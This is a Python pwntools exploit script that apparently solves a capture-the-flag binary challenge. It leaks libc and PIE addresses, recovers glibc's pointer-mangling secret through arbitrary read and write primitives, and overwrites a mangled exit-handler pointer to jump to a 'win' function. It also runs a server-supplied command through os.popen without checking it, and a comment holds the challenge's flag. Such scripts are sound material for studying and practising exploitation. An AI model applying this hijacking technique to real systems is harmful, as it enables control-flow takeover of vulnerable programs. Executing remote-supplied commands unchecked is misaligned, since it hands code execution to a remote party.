#!/usr/bin/env python
from pwn import *
from time import sleep
import os

exe = ELF("./main")

context.binary = exe

sshc = None
r = None
nc = "nc 20.122.85.188 1338"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.5

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
        
        r.recvuntil(b"proof of work: ")
        cmd = r.readline().strip().decode()
        
        outbuf = os.popen(cmd)
        ans = outbuf.read().strip().encode()
        
        r.sendline(ans)
    
    return r


def read(adr):
    global r
    sendl(b"1")
    
    sendl(str(adr).encode())
    r.recvuntil(b"data : ")
    
    data = int("0x" + r.readline().strip().decode(), 16)
    return data


def write(adr, data):
    global r
    sendl(b"2")
    
    sendl(str(adr).encode())
    
    sendl(str(data).encode())


def main():
    global r
    r = conn()
    
    sendl(b"1337")
    r.recvuntil(b"ft as always ")
    
    leak = int(readl().strip(), 16)
    #logh("leak", leak)
    
    libc_base = leak + 0x28c0
    logh("libc base", libc_base)
    
    initials = 0x1f8300+libc_base
    pie_target = initials + 8*9
    mangled_ptr = pie_target - 16
    
    pie_leak = read(pie_target)
    logh("pie_leak", pie_leak)
    
    pie_base = pie_leak - 0x4008
    logh("pie_base", pie_base)
    
    ptr = read(mangled_ptr)
    logh("Mangled ptr", ptr)
    
    ror17 = lambda x : ((x << 47) & (2**64 - 1)) | (x >> 17)
    secret = ror17(ptr) ^ (exe.symbols.cleanup + pie_base)
    
    logh("Secret", secret)
    
    # Mangle win adr
    rol17 = lambda x : ((x << 17) & (2**64 - 1)) | (x >> 47)
    mangle = lambda addr : rol17(addr ^ secret)
    
    mangled_win = mangle(exe.symbols.win + pie_base)
    logh("Mangled win", mangled_win)
    
    write(mangled_ptr, mangled_win)
    
    sendl(b"0")

    r.interactive() # hackfest{54a8540a42f01365c88034d4830f2f4db1ca22f7d40b70700d23d58899310ccb}



if __name__ == "__main__":
    main()

